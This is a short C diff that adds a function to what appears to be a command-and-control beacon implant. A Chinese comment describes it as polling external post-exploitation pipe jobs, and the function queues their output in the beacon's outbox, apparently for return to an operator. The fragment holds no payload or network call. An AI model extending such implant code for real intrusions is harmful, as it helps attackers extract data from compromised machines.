@@ -152,3 +152,18 @@ VOID AgentFlushCascade(BeaconContext* ctx)
 
     PlistFree(&out);
 }
+
+/* 轮询外部 post-ex pipe job 输出 */
+VOID AgentFlushPostEx(BeaconContext* ctx)
+{
+    PacketList out = PostExPoll(&ctx->postex);
+    SIZE_T i;
+
+    for (i = 0; i < out.count; ++i) {
+        ByteBuf moved = out.items[i];
+        BbInit(&out.items[i]);
+        OutboxEnqueue(&ctx->outbox, moved);
+    }
+
+    PlistFree(&out);
+}
